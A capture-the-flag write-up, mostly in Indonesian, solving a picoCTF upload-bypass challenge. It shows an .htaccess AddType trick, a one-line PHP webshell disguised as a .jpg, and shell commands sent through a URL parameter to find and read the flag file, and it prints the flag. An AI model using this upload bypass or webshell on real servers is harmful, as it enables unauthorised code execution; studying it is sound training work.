# byp4ss3d-Write-Up

![ss](https://github.com/Naendratama/byp4ss3d-Write-Up/blob/main/Screenshot%202026-02-28%20223639.png)

Category: Web Exploitation

Difficulty: Medium

Author: Yahaya Meddy

Description: A university's online registration portal asks students to upload their ID cards for verification. The developer put some filters in place to ensure only image files are uploaded but are they enough? Take a look at how the upload is implemented. Maybe there's a way to slip past the checks and interact with the server in ways you shouldn't.

Hints: 
1. Apache can be tricked into executing non-PHP files as PHP with a .htaccess file.
2. Try uploading more than just one file.

Recoon:
dari deskripsi CTF itu sudah jelas mengarah ke file upload vulnerability. Berikut kata kunci yang membuktikannya:

"asks students to upload their ID cards"
→ Ada fitur upload file

"developer put some filters in place to ensure only image files are uploaded"
→ Ada validasi/filter, tapi dipertanyakan apakah cukup

"but are they enough?"
→ Petunjuk eksplisit bahwa filternya bisa dibypass

"slip past the checks"
→ Konfirmasi ada cara untuk melewati validasi

"interact with the server in ways you shouldn't"
→ Mengarah ke RCE (Remote Code Execution) seperti yang kamu lakukan tadi

![ss](https://github.com/Naendratama/byp4ss3d-Write-Up/blob/main/Screenshot%202026-02-28%20223736.png)

Enumeration:
Ayo kita buat file jenis .htacess, karena web tersebut hanya menerima file jensi png, jpg, dan gif. Seperti payloadnya
    
    AddType application/x-httpd-php .jpg

Untuk nama filenya itu file ".htaccess"

Jika tidak bisa, maka gunakan payload:
    
    AddType application/x-httpd-php .png
    AddType application/x-httpd-php .gif
    AddType application/x-httpd-php .xyz

Setelah itu, ayo kita buat file webshell yang menyamar menjadi file jpg
ini payloadnya:
                
                <?php system($_GET['cmd']); ?>

Nama filenya itu shell.jpg

Setelah dibuat, cuss kita langsung upload ke 2 file tersebut.

Kita upload file .htaccess terlebih dahulu

Setelah upload sukses, ayo kita upload file shell.jpg nya

![ss](https://github.com/Naendratama/byp4ss3d-Write-Up/blob/main/Screenshot%202026-03-01%20143253.png)

Setelah sukses, kita click shell.jpg nya yangg berwarna biru

![ss](https://github.com/Naendratama/byp4ss3d-Write-Up/blob/main/Screenshot%202026-03-01%20143313.png)

Terlihat belum ada keberadaan dari flagnya, ayo coba kita cari dengan menambahkan:
    
    ?cmd=find%20/%20-name%20%22flag*%22%202%3E/dev/null

![ss](https://github.com/Naendratama/byp4ss3d-Write-Up/blob/main/Screenshot%202026-03-01%20143345.png)

Terlihat terdapat flag.txt di direktori /var/www/flag.txt 

Ayo kita menuju direktori tersebut, ganti command find tersebut, dengann:

    ?cmd=cat /var/www/flag.txt

![ss](https://github.com/Naendratama/byp4ss3d-Write-Up/blob/main/Screenshot%202026-03-01%20143450.png)

Voila flag telah ditemukann!

Flag:picoCTF{s3rv3r_byp4ss_77c49c68}

       
       
